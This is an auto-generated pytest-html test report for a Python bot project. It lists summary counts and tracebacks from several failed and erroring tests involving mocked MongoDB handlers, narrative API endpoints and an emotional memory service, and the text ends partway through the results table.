<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8"/>
    <title>test-report.html</title>
    <style>body {
  font-family: Helvetica, Arial, sans-serif;
  font-size: 12px;
  /* do not increase min-width as some may use split screens */
  min-width: 800px;
  color: #999;
}

h1 {
  font-size: 24px;
  color: black;
}

h2 {
  font-size: 16px;
  color: black;
}

p {
  color: black;
}

a {
  color: #999;
}

table {
  border-collapse: collapse;
}

/******************************
 * SUMMARY INFORMATION
 ******************************/
#environment td {
  padding: 5px;
  border: 1px solid #E6E6E6;
}
#environment tr:nth-child(odd) {
  background-color: #f6f6f6;
}

/******************************
 * TEST RESULT COLORS
 ******************************/
span.passed,
.passed .col-result {
  color: green;
}

span.skipped,
span.xfailed,
span.rerun,
.skipped .col-result,
.xfailed .col-result,
.rerun .col-result {
  color: orange;
}

span.error,
span.failed,
span.xpassed,
.error .col-result,
.failed .col-result,
.xpassed .col-result {
  color: red;
}

/******************************
 * RESULTS TABLE
 *
 * 1. Table Layout
 * 2. Extra
 * 3. Sorting items
 *
 ******************************/
/*------------------
 * 1. Table Layout
 *------------------*/
#results-table {
  border: 1px solid #e6e6e6;
  color: #999;
  font-size: 12px;
  width: 100%;
}
#results-table th,
#results-table td {
  padding: 5px;
  border: 1px solid #E6E6E6;
  text-align: left;
}
#results-table th {
  font-weight: bold;
}

/*------------------
 * 2. Extra
 *------------------*/
.log {
  background-color: #e6e6e6;
  border: 1px solid #e6e6e6;
  color: black;
  display: block;
  font-family: "Courier New", Courier, monospace;
  height: 230px;
  overflow-y: scroll;
  padding: 5px;
  white-space: pre-wrap;
}
.log:only-child {
  height: inherit;
}

div.image {
  border: 1px solid #e6e6e6;
  float: right;
  height: 240px;
  margin-left: 5px;
  overflow: hidden;
  width: 320px;
}
div.image img {
  width: 320px;
}

div.video {
  border: 1px solid #e6e6e6;
  float: right;
  height: 240px;
  margin-left: 5px;
  overflow: hidden;
  width: 320px;
}
div.video video {
  overflow: hidden;
  width: 320px;
  height: 240px;
}

.collapsed {
  display: none;
}

.expander::after {
  content: " (show details)";
  color: #BBB;
  font-style: italic;
  cursor: pointer;
}

.collapser::after {
  content: " (hide details)";
  color: #BBB;
  font-style: italic;
  cursor: pointer;
}

/*------------------
 * 3. Sorting items
 *------------------*/
.sortable {
  cursor: pointer;
}

.sort-icon {
  font-size: 0px;
  float: left;
  margin-right: 5px;
  margin-top: 5px;
  /*triangle*/
  width: 0;
  height: 0;
  border-left: 8px solid transparent;
  border-right: 8px solid transparent;
}
.inactive .sort-icon {
  /*finish triangle*/
  border-top: 8px solid #E6E6E6;
}
.asc.active .sort-icon {
  /*finish triangle*/
  border-bottom: 8px solid #999;
}
.desc.active .sort-icon {
  /*finish triangle*/
  border-top: 8px solid #999;
}
</style></head>
  <body onLoad="init()">
    <script>/* This Source Code Form is subject to the terms of the Mozilla Public
 * License, v. 2.0. If a copy of the MPL was not distributed with this file,
 * You can obtain one at http://mozilla.org/MPL/2.0/. */


function toArray(iter) {
    if (iter === null) {
        return null;
    }
    return Array.prototype.slice.call(iter);
}

function find(selector, elem) { // eslint-disable-line no-redeclare
    if (!elem) {
        elem = document;
    }
    return elem.querySelector(selector);
}

function findAll(selector, elem) {
    if (!elem) {
        elem = document;
    }
    return toArray(elem.querySelectorAll(selector));
}

function sortColumn(elem) {
    toggleSortStates(elem);
    const colIndex = toArray(elem.parentNode.childNodes).indexOf(elem);
    let key;
    if (elem.classList.contains('result')) {
        key = keyResult;
    } else if (elem.classList.contains('links')) {
        key = keyLink;
    } else {
        key = keyAlpha;
    }
    sortTable(elem, key(colIndex));
}

function showAllExtras() { // eslint-disable-line no-unused-vars
    findAll('.col-result').forEach(showExtras);
}

function hideAllExtras() { // eslint-disable-line no-unused-vars
    findAll('.col-result').forEach(hideExtras);
}

function showExtras(colresultElem) {
    const extras = colresultElem.parentNode.nextElementSibling;
    const expandcollapse = colresultElem.firstElementChild;
    extras.classList.remove('collapsed');
    expandcollapse.classList.remove('expander');
    expandcollapse.classList.add('collapser');
}

function hideExtras(colresultElem) {
    const extras = colresultElem.parentNode.nextElementSibling;
    const expandcollapse = colresultElem.firstElementChild;
    extras.classList.add('collapsed');
    expandcollapse.classList.remove('collapser');
    expandcollapse.classList.add('expander');
}

function showFilters() {
    let visibleString = getQueryParameter('visible') || 'all';
    visibleString = visibleString.toLowerCase();
    const checkedItems = visibleString.split(',');

    const filterItems = document.getElementsByClassName('filter');
    for (let i = 0; i < filterItems.length; i++) {
        filterItems[i].hidden = false;

        if (visibleString != 'all') {
            filterItems[i].checked = checkedItems.includes(filterItems[i].getAttribute('data-test-result'));
            filterTable(filterItems[i]);
        }
    }
}

function addCollapse() {
    // Add links for show/hide all
    const resulttable = find('table#results-table');
    const showhideall = document.createElement('p');
    showhideall.innerHTML = '<a href="javascript:showAllExtras()">Show all details</a> / ' +
                            '<a href="javascript:hideAllExtras()">Hide all details</a>';
    resulttable.parentElement.insertBefore(showhideall, resulttable);

    // Add show/hide link to each result
    findAll('.col-result').forEach(function(elem) {
        const collapsed = getQueryParameter('collapsed') || 'Passed';
        const extras = elem.parentNode.nextElementSibling;
        const expandcollapse = document.createElement('span');
        if (extras.classList.contains('collapsed')) {
            expandcollapse.classList.add('expander');
        } else if (collapsed.includes(elem.innerHTML)) {
            extras.classList.add('collapsed');
            expandcollapse.classList.add('expander');
        } else {
            expandcollapse.classList.add('collapser');
        }
        elem.appendChild(expandcollapse);

        elem.addEventListener('click', function(event) {
            if (event.currentTarget.parentNode.nextElementSibling.classList.contains('collapsed')) {
                showExtras(event.currentTarget);
            } else {
                hideExtras(event.currentTarget);
            }
        });
    });
}

function getQueryParameter(name) {
    const match = RegExp('[?&]' + name + '=([^&]*)').exec(window.location.search);
    return match && decodeURIComponent(match[1].replace(/\+/g, ' '));
}

function init () { // eslint-disable-line no-unused-vars
    resetSortHeaders();

    addCollapse();

    showFilters();

    sortColumn(find('.initial-sort'));

    findAll('.sortable').forEach(function(elem) {
        elem.addEventListener('click',
            function() {
                sortColumn(elem);
            }, false);
    });
}

function sortTable(clicked, keyFunc) {
    const rows = findAll('.results-table-row');
    const reversed = !clicked.classList.contains('asc');
    const sortedRows = sort(rows, keyFunc, reversed);
    /* Whole table is removed here because browsers acts much slower
     * when appending existing elements.
     */
    const thead = document.getElementById('results-table-head');
    document.getElementById('results-table').remove();
    const parent = document.createElement('table');
    parent.id = 'results-table';
    parent.appendChild(thead);
    sortedRows.forEach(function(elem) {
        parent.appendChild(elem);
    });
    document.getElementsByTagName('BODY')[0].appendChild(parent);
}

function sort(items, keyFunc, reversed) {
    const sortArray = items.map(function(item, i) {
        return [keyFunc(item), i];
    });

    sortArray.sort(function(a, b) {
        const keyA = a[0];
        const keyB = b[0];

        if (keyA == keyB) return 0;

        if (reversed) {
            return keyA < keyB ? 1 : -1;
        } else {
            return keyA > keyB ? 1 : -1;
        }
    });

    return sortArray.map(function(item) {
        const index = item[1];
        return items[index];
    });
}

function keyAlpha(colIndex) {
    return function(elem) {
        return elem.childNodes[1].childNodes[colIndex].firstChild.data.toLowerCase();
    };
}

function keyLink(colIndex) {
    return function(elem) {
        const dataCell = elem.childNodes[1].childNodes[colIndex].firstChild;
        return dataCell == null ? '' : dataCell.innerText.toLowerCase();
    };
}

function keyResult(colIndex) {
    return function(elem) {
        const strings = ['Error', 'Failed', 'Rerun', 'XFailed', 'XPassed',
            'Skipped', 'Passed'];
        return strings.indexOf(elem.childNodes[1].childNodes[colIndex].firstChild.data);
    };
}

function resetSortHeaders() {
    findAll('.sort-icon').forEach(function(elem) {
        elem.parentNode.removeChild(elem);
    });
    findAll('.sortable').forEach(function(elem) {
        const icon = document.createElement('div');
        icon.className = 'sort-icon';
        icon.textContent = 'vvv';
        elem.insertBefore(icon, elem.firstChild);
        elem.classList.remove('desc', 'active');
        elem.classList.add('asc', 'inactive');
    });
}

function toggleSortStates(elem) {
    //if active, toggle between asc and desc
    if (elem.classList.contains('active')) {
        elem.classList.toggle('asc');
        elem.classList.toggle('desc');
    }

    //if inactive, reset all other functions and add ascending active
    if (elem.classList.contains('inactive')) {
        resetSortHeaders();
        elem.classList.remove('inactive');
        elem.classList.add('active');
    }
}

function isAllRowsHidden(value) {
    return value.hidden == false;
}

function filterTable(elem) { // eslint-disable-line no-unused-vars
    const outcomeAtt = 'data-test-result';
    const outcome = elem.getAttribute(outcomeAtt);
    const classOutcome = outcome + ' results-table-row';
    const outcomeRows = document.getElementsByClassName(classOutcome);

    for(let i = 0; i < outcomeRows.length; i++){
        outcomeRows[i].hidden = !elem.checked;
    }

    const rows = findAll('.results-table-row').filter(isAllRowsHidden);
    const allRowsHidden = rows.length == 0 ? true : false;
    const notFoundMessage = document.getElementById('not-found-message');
    notFoundMessage.hidden = !allRowsHidden;
}
</script>
    <h1>test-report.html</h1>
    <p>Report generated on 20-Sep-2025 at 23:26:42 by <a href="https://pypi.python.org/pypi/pytest-html">pytest-html</a> v3.2.0</p>
    <h2>Summary</h2>
    <p>500 tests ran in 1032.05 seconds. </p>
    <p class="filter" hidden="true">(Un)check the boxes to filter the results.</p><input checked="true" class="filter" data-test-result="passed" hidden="true" name="filter_checkbox" onChange="filterTable(this)" type="checkbox"/><span class="passed">438 passed</span>, <input checked="true" class="filter" data-test-result="skipped" hidden="true" name="filter_checkbox" onChange="filterTable(this)" type="checkbox"/><span class="skipped">34 skipped</span>, <input checked="true" class="filter" data-test-result="failed" hidden="true" name="filter_checkbox" onChange="filterTable(this)" type="checkbox"/><span class="failed">62 failed</span>, <input checked="true" class="filter" data-test-result="error" hidden="true" name="filter_checkbox" onChange="filterTable(this)" type="checkbox"/><span class="error">11 errors</span>, <input checked="true" class="filter" data-test-result="xfailed" disabled="true" hidden="true" name="filter_checkbox" onChange="filterTable(this)" type="checkbox"/><span class="xfailed">0 expected failures</span>, <input checked="true" class="filter" data-test-result="xpassed" disabled="true" hidden="true" name="filter_checkbox" onChange="filterTable(this)" type="checkbox"/><span class="xpassed">0 unexpected passes</span>
    <h2>Results</h2>
    <table id="results-table">
      <thead id="results-table-head">
        <tr>
          <th class="sortable result initial-sort" col="result">Result</th>
          <th class="sortable" col="name">Test</th>
          <th class="sortable" col="duration">Duration</th>
          <th class="sortable links" col="links">Links</th></tr>
        <tr hidden="true" id="not-found-message">
          <th colspan="4">No results found. Try to check the filters</th></tr></thead>
      <tbody class="error results-table-row">
        <tr>
          <td class="col-result">Error</td>
          <td class="col-name">tests/e2e/test_admin_workflows.py::TestAdminWorkflows::test_complete_admin_workflow::setup</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">@pytest.fixture<br/>    def mock_mongodb_handler():<br/>        &quot;&quot;&quot;Create a mock MongoDB handler for testing.&quot;&quot;&quot;<br/>        mock_handler = Mock(spec=MongoDBHandler)<br/>        # Set up mock collections<br/>        mock_handler.get_users_collection.return_value = Mock()<br/>&gt;       mock_handler.get_subscriptions_collection.return_value = Mock()<br/><br/>tests/e2e/test_admin_workflows.py:37: <br/>_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ <br/><br/>self = &lt;Mock spec=&#x27;MongoDBHandler&#x27; id=&#x27;137537738733712&#x27;&gt;<br/>name = &#x27;get_subscriptions_collection&#x27;<br/><br/>    def __getattr__(self, name):<br/>        if name in {&#x27;_mock_methods&#x27;, &#x27;_mock_unsafe&#x27;}:<br/>            raise AttributeError(name)<br/>        elif self._mock_methods is not None:<br/>            if name not in self._mock_methods or name in _all_magics:<br/>&gt;               raise AttributeError(&quot;Mock object has no attribute %r&quot; % name)<br/><span class="error">E               AttributeError: Mock object has no attribute &#x27;get_subscriptions_collection&#x27;. Did you mean: &#x27;get_auctions_collection&#x27;?</span><br/><br/>/usr/lib/python3.12/unittest/mock.py:658: AttributeError<br/></div></td></tr></tbody>
      <tbody class="error results-table-row">
        <tr>
          <td class="col-result">Error</td>
          <td class="col-name">tests/e2e/test_admin_workflows.py::TestAdminWorkflows::test_admin_command_workflow::setup</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">@pytest.fixture<br/>    def mock_mongodb_handler():<br/>        &quot;&quot;&quot;Create a mock MongoDB handler for testing.&quot;&quot;&quot;<br/>        mock_handler = Mock(spec=MongoDBHandler)<br/>        # Set up mock collections<br/>        mock_handler.get_users_collection.return_value = Mock()<br/>&gt;       mock_handler.get_subscriptions_collection.return_value = Mock()<br/><br/>tests/e2e/test_admin_workflows.py:37: <br/>_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ <br/><br/>self = &lt;Mock spec=&#x27;MongoDBHandler&#x27; id=&#x27;137537619752864&#x27;&gt;<br/>name = &#x27;get_subscriptions_collection&#x27;<br/><br/>    def __getattr__(self, name):<br/>        if name in {&#x27;_mock_methods&#x27;, &#x27;_mock_unsafe&#x27;}:<br/>            raise AttributeError(name)<br/>        elif self._mock_methods is not None:<br/>            if name not in self._mock_methods or name in _all_magics:<br/>&gt;               raise AttributeError(&quot;Mock object has no attribute %r&quot; % name)<br/><span class="error">E               AttributeError: Mock object has no attribute &#x27;get_subscriptions_collection&#x27;. Did you mean: &#x27;get_auctions_collection&#x27;?</span><br/><br/>/usr/lib/python3.12/unittest/mock.py:658: AttributeError<br/></div></td></tr></tbody>
      <tbody class="error results-table-row">
        <tr>
          <td class="col-result">Error</td>
          <td class="col-name">tests/e2e/test_admin_workflows.py::TestAdminWorkflows::test_subscription_expiration_workflow::setup</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">@pytest.fixture<br/>    def mock_mongodb_handler():<br/>        &quot;&quot;&quot;Create a mock MongoDB handler for testing.&quot;&quot;&quot;<br/>        mock_handler = Mock(spec=MongoDBHandler)<br/>        # Set up mock collections<br/>        mock_handler.get_users_collection.return_value = Mock()<br/>&gt;       mock_handler.get_subscriptions_collection.return_value = Mock()<br/><br/>tests/e2e/test_admin_workflows.py:37: <br/>_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ <br/><br/>self = &lt;Mock spec=&#x27;MongoDBHandler&#x27; id=&#x27;137537619740576&#x27;&gt;<br/>name = &#x27;get_subscriptions_collection&#x27;<br/><br/>    def __getattr__(self, name):<br/>        if name in {&#x27;_mock_methods&#x27;, &#x27;_mock_unsafe&#x27;}:<br/>            raise AttributeError(name)<br/>        elif self._mock_methods is not None:<br/>            if name not in self._mock_methods or name in _all_magics:<br/>&gt;               raise AttributeError(&quot;Mock object has no attribute %r&quot; % name)<br/><span class="error">E               AttributeError: Mock object has no attribute &#x27;get_subscriptions_collection&#x27;. Did you mean: &#x27;get_auctions_collection&#x27;?</span><br/><br/>/usr/lib/python3.12/unittest/mock.py:658: AttributeError<br/></div></td></tr></tbody>
      <tbody class="error results-table-row">
        <tr>
          <td class="col-result">Error</td>
          <td class="col-name">tests/e2e/test_admin_workflows.py::TestAdminWorkflows::test_admin_workflow_error_handling::setup</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">@pytest.fixture<br/>    def mock_mongodb_handler():<br/>        &quot;&quot;&quot;Create a mock MongoDB handler for testing.&quot;&quot;&quot;<br/>        mock_handler = Mock(spec=MongoDBHandler)<br/>        # Set up mock collections<br/>        mock_handler.get_users_collection.return_value = Mock()<br/>&gt;       mock_handler.get_subscriptions_collection.return_value = Mock()<br/><br/>tests/e2e/test_admin_workflows.py:37: <br/>_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ <br/><br/>self = &lt;Mock spec=&#x27;MongoDBHandler&#x27; id=&#x27;137537738725312&#x27;&gt;<br/>name = &#x27;get_subscriptions_collection&#x27;<br/><br/>    def __getattr__(self, name):<br/>        if name in {&#x27;_mock_methods&#x27;, &#x27;_mock_unsafe&#x27;}:<br/>            raise AttributeError(name)<br/>        elif self._mock_methods is not None:<br/>            if name not in self._mock_methods or name in _all_magics:<br/>&gt;               raise AttributeError(&quot;Mock object has no attribute %r&quot; % name)<br/><span class="error">E               AttributeError: Mock object has no attribute &#x27;get_subscriptions_collection&#x27;. Did you mean: &#x27;get_auctions_collection&#x27;?</span><br/><br/>/usr/lib/python3.12/unittest/mock.py:658: AttributeError<br/></div></td></tr></tbody>
      <tbody class="error results-table-row">
        <tr>
          <td class="col-result">Error</td>
          <td class="col-name">tests/integration/test_api.py::TestAPIIntegration::test_get_narrative_fragment_success::setup</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">self = &lt;tests.integration.test_api.TestAPIIntegration object at 0x7d1701648f80&gt;<br/>mock_narrative_service = &lt;src.services.narrative.NarrativeService object at 0x7d16f8feed20&gt;<br/><br/>    @pytest.fixture<br/>    def narrative_api_client(self, mock_narrative_service):<br/>        &quot;&quot;&quot;Create a test client with narrative router.&quot;&quot;&quot;<br/>        app = FastAPI()<br/>        app.include_router(narrative_router)<br/>    <br/>        # Override the narrative service dependency<br/>        def override_get_narrative_service():<br/>            return mock_narrative_service<br/>    <br/>        # Override the dependencies using the function names directly<br/>&gt;       from src.api.endpoints.narrative import get_narrative_service, get_current_service<br/><span class="error">E       ImportError: cannot import name &#x27;get_narrative_service&#x27; from &#x27;src.api.endpoints.narrative&#x27; (/home/azureuser/repos/yabot/src/api/endpoints/narrative.py)</span><br/><br/>tests/integration/test_api.py:86: ImportError<br/></div></td></tr></tbody>
      <tbody class="error results-table-row">
        <tr>
          <td class="col-result">Error</td>
          <td class="col-name">tests/integration/test_api.py::TestAPIIntegration::test_get_narrative_fragment_not_found::setup</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">self = &lt;tests.integration.test_api.TestAPIIntegration object at 0x7d1701649100&gt;<br/>mock_narrative_service = &lt;src.services.narrative.NarrativeService object at 0x7d16f8fe3890&gt;<br/><br/>    @pytest.fixture<br/>    def narrative_api_client(self, mock_narrative_service):<br/>        &quot;&quot;&quot;Create a test client with narrative router.&quot;&quot;&quot;<br/>        app = FastAPI()<br/>        app.include_router(narrative_router)<br/>    <br/>        # Override the narrative service dependency<br/>        def override_get_narrative_service():<br/>            return mock_narrative_service<br/>    <br/>        # Override the dependencies using the function names directly<br/>&gt;       from src.api.endpoints.narrative import get_narrative_service, get_current_service<br/><span class="error">E       ImportError: cannot import name &#x27;get_narrative_service&#x27; from &#x27;src.api.endpoints.narrative&#x27; (/home/azureuser/repos/yabot/src/api/endpoints/narrative.py)</span><br/><br/>tests/integration/test_api.py:86: ImportError<br/></div></td></tr></tbody>
      <tbody class="error results-table-row">
        <tr>
          <td class="col-result">Error</td>
          <td class="col-name">tests/integration/test_api.py::TestAPIIntegration::test_get_narrative_fragment_unauthorized::setup</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">self = &lt;tests.integration.test_api.TestAPIIntegration object at 0x7d1701649280&gt;<br/>mock_narrative_service = &lt;src.services.narrative.NarrativeService object at 0x7d16f8f302c0&gt;<br/><br/>    @pytest.fixture<br/>    def narrative_api_client(self, mock_narrative_service):<br/>        &quot;&quot;&quot;Create a test client with narrative router.&quot;&quot;&quot;<br/>        app = FastAPI()<br/>        app.include_router(narrative_router)<br/>    <br/>        # Override the narrative service dependency<br/>        def override_get_narrative_service():<br/>            return mock_narrative_service<br/>    <br/>        # Override the dependencies using the function names directly<br/>&gt;       from src.api.endpoints.narrative import get_narrative_service, get_current_service<br/><span class="error">E       ImportError: cannot import name &#x27;get_narrative_service&#x27; from &#x27;src.api.endpoints.narrative&#x27; (/home/azureuser/repos/yabot/src/api/endpoints/narrative.py)</span><br/><br/>tests/integration/test_api.py:86: ImportError<br/></div></td></tr></tbody>
      <tbody class="error results-table-row">
        <tr>
          <td class="col-result">Error</td>
          <td class="col-name">tests/unit/emotional/test_memory_service.py::test_record_significant_moment::setup</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">mock_database_manager = &lt;Mock id=&#x27;137537615942704&#x27;&gt;<br/>mock_event_bus = &lt;Mock id=&#x27;137537618918960&#x27;&gt;<br/><br/>    @pytest.fixture<br/>    def emotional_memory_service(mock_database_manager, mock_event_bus):<br/>        &quot;&quot;&quot;Fixture for EmotionalMemoryService with mocked dependencies.&quot;&quot;&quot;<br/>&gt;       return EmotionalMemoryService(<br/>            database_manager=mock_database_manager,<br/>            event_bus=mock_event_bus<br/>        )<br/><br/>tests/unit/emotional/test_memory_service.py:19: <br/>_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ <br/><br/>self = &lt;src.modules.emotional.memory_service.EmotionalMemoryService object at 0x7d16f8eb2bd0&gt;<br/>database_manager = &lt;Mock id=&#x27;137537615942704&#x27;&gt;<br/>event_bus = &lt;Mock id=&#x27;137537618918960&#x27;&gt;<br/><br/>    def __init__(self, database_manager: DatabaseManager, event_bus: EventBus):<br/>        &quot;&quot;&quot;Initialize the EmotionalMemoryService.<br/>    <br/>        Args:<br/>            database_manager (DatabaseManager): Instance for database operations.<br/>            event_bus (EventBus): Instance for publishing events.<br/>        &quot;&quot;&quot;<br/>        self.database_manager = database_manager<br/>        self.event_bus = event_bus<br/>&gt;       self.collection = self.database_manager.get_mongo_db()[&quot;memory_fragments&quot;]<br/><span class="error">E       TypeError: &#x27;Mock&#x27; object is not subscriptable</span><br/><br/>src/modules/emotional/memory_service.py:37: TypeError<br/></div></td></tr></tbody>
      <tbody class="error results-table-row">
        <tr>
          <td class="col-result">Error</td>
          <td class="col-name">tests/unit/emotional/test_memory_service.py::test_retrieve_relevant_memories::setup</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">mock_database_manager = &lt;Mock id=&#x27;137537615583360&#x27;&gt;<br/>mock_event_bus = &lt;Mock id=&#x27;137537615586720&#x27;&gt;<br/><br/>    @pytest.fixture<br/>    def emotional_memory_service(mock_database_manager, mock_event_bus):<br/>        &quot;&quot;&quot;Fixture for EmotionalMemoryService with mocked dependencies.&quot;&quot;&quot;<br/>&gt;       return EmotionalMemoryService(<br/>            database_manager=mock_database_manager,<br/>            event_bus=mock_event_bus<br/>        )<br/><br/>tests/unit/emotional/test_memory_service.py:19: <br/>_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ <br/><br/>self = &lt;src.modules.emotional.memory_service.EmotionalMemoryService object at 0x7d16f8b84ef0&gt;<br/>database_manager = &lt;Mock id=&#x27;137537615583360&#x27;&gt;<br/>event_bus = &lt;Mock id=&#x27;137537615586720&#x27;&gt;<br/><br/>    def __init__(self, database_manager: DatabaseManager, event_bus: EventBus):<br/>        &quot;&quot;&quot;Initialize the EmotionalMemoryService.<br/>    <br/>        Args:<br/>            database_manager (DatabaseManager): Instance for database operations.<br/>            event_bus (EventBus): Instance for publishing events.<br/>        &quot;&quot;&quot;<br/>        self.database_manager = database_manager<br/>        self.event_bus = event_bus<br/>&gt;       self.collection = self.database_manager.get_mongo_db()[&quot;memory_fragments&quot;]<br/><span class="error">E       TypeError: &#x27;Mock&#x27; object is not subscriptable</span><br/><br/>src/modules/emotional/memory_service.py:37: TypeError<br/></div></td></tr></tbody>
      <tbody class="error results-table-row">
        <tr>
          <td class="col-result">Error</td>
          <td class="col-name">tests/unit/emotional/test_memory_service.py::test_update_relationship_evolution::setup</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">mock_database_manager = &lt;Mock id=&#x27;137537615178080&#x27;&gt;<br/>mock_event_bus = &lt;Mock id=&#x27;137537615177120&#x27;&gt;<br/><br/>    @pytest.fixture<br/>    def emotional_memory_service(mock_database_manager, mock_event_bus):<br/>        &quot;&quot;&quot;Fixture for EmotionalMemoryService with mocked dependencies.&quot;&quot;&quot;<br/>&gt;       return EmotionalMemoryService(<br/>            database_manager=mock_database_manager,<br/>            event_bus=mock_event_bus<br/>        )<br/><br/>tests/unit/emotional/test_memory_service.py:19: <br/>_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ <br/><br/>self = &lt;src.modules.emotional.memory_service.EmotionalMemoryService object at 0x7d16f8b21be0&gt;<br/>database_manager = &lt;Mock id=&#x27;137537615178080&#x27;&gt;<br/>event_bus = &lt;Mock id=&#x27;137537615177120&#x27;&gt;<br/><br/>    def __init__(self, database_manager: DatabaseManager, event_bus: EventBus):<br/>        &quot;&quot;&quot;Initialize the EmotionalMemoryService.<br/>    <br/>        Args:<br/>            database_manager (DatabaseManager): Instance for database operations.<br/>            event_bus (EventBus): Instance for publishing events.<br/>        &quot;&quot;&quot;<br/>        self.database_manager = database_manager<br/>        self.event_bus = event_bus<br/>&gt;       self.collection = self.database_manager.get_mongo_db()[&quot;memory_fragments&quot;]<br/><span class="error">E       TypeError: &#x27;Mock&#x27; object is not subscriptable</span><br/><br/>src/modules/emotional/memory_service.py:37: TypeError<br/></div></td></tr></tbody>
      <tbody class="error results-table-row">
        <tr>
          <td class="col-result">Error</td>
          <td class="col-name">tests/unit/emotional/test_memory_service.py::test_generate_natural_callbacks::setup</td>
          <td class="col-duration">0.02</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">mock_database_manager = &lt;Mock id=&#x27;137537615175584&#x27;&gt;<br/>mock_event_bus = &lt;Mock id=&#x27;137537615181344&#x27;&gt;<br/><br/>    @pytest.fixture<br/>    def emotional_memory_service(mock_database_manager, mock_event_bus):<br/>        &quot;&quot;&quot;Fixture for EmotionalMemoryService with mocked dependencies.&quot;&quot;&quot;<br/>&gt;       return EmotionalMemoryService(<br/>            database_manager=mock_database_manager,<br/>            event_bus=mock_event_bus<br/>        )<br/><br/>tests/unit/emotional/test_memory_service.py:19: <br/>_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ <br/><br/>self = &lt;src.modules.emotional.memory_service.EmotionalMemoryService object at 0x7d16f8b20290&gt;<br/>database_manager = &lt;Mock id=&#x27;137537615175584&#x27;&gt;<br/>event_bus = &lt;Mock id=&#x27;137537615181344&#x27;&gt;<br/><br/>    def __init__(self, database_manager: DatabaseManager, event_bus: EventBus):<br/>        &quot;&quot;&quot;Initialize the EmotionalMemoryService.<br/>    <br/>        Args:<br/>            database_manager (DatabaseManager): Instance for database operations.<br/>            event_bus (EventBus): Instance for publishing events.<br/>        &quot;&quot;&quot;<br/>        self.database_manager = database_manager<br/>        self.event_bus = event_bus<br/>&gt;       self.collection = self.database_manager.get_mongo_db()[&quot;memory_fragments&quot;]<br/><span class="error">E       TypeError: &#x27;Mock&#x27; object is not subscriptable</span><br/><br/>src/modules/emotional/memory_service.py:37: TypeError<br/></div></td></tr></tbody>
      <tbody class="failed results-table-row">
        <tr>
          <td class="col-result">Failed</td>
          <td class="col-name">tests/test_event_models.py::test_event_models_dict</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">def test_event_models_dict():<br/>        &quot;&quot;&quot;Test EVENT_MODELS dictionary.&quot;&quot;&quot;<br/>        assert isinstance(EVENT_MODELS, dict)<br/>&gt;       assert len(EVENT_MODELS) == 34<br/><span class="error">E       AssertionError: assert 37 == 34</span><br/><span class="error">E        +  where 37 = len({&#x27;achievement_unlocked&#x27;: &lt;class &#x27;src.events.models.AchievementUnlockedEvent&#x27;&gt;, &#x27;besitos_awarded&#x27;: &lt;class &#x27;src.events.m...vents.models.BesitosSpentEvent&#x27;&gt;, &#x27;circuit_breaker_closed&#x27;: &lt;class &#x27;src.events.models.CircuitBreakerClosedEvent&#x27;&gt;, ...})</span><br/><br/>tests/test_event_models.py:220: AssertionError<br/></div></td></tr></tbody>
      <tbody class="failed results-table-row">
        <tr>
          <td class="col-result">Failed</td>
          <td class="col-name">tests/test_narrative_endpoints.py::TestNarrativeAPIEndpoints::test_router_prefix_and_tags</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">self = &lt;tests.test_narrative_endpoints.TestNarrativeAPIEndpoints object at 0x7d17018f6240&gt;<br/><br/>    def test_router_prefix_and_tags(self):<br/>        &quot;&quot;&quot;Test that router has correct prefix and tags.&quot;&quot;&quot;<br/>&gt;       assert router.prefix == &quot;/api/v1/narrative&quot;<br/><span class="error">E       AssertionError: assert &#x27;&#x27; == &#x27;/api/v1/narrative&#x27;</span><br/><span class="error">E         - /api/v1/narrative</span><br/><br/>tests/test_narrative_endpoints.py:23: AssertionError<br/></div></td></tr></tbody>
      <tbody class="failed results-table-row">
        <tr>
          <td class="col-result">Failed</td>
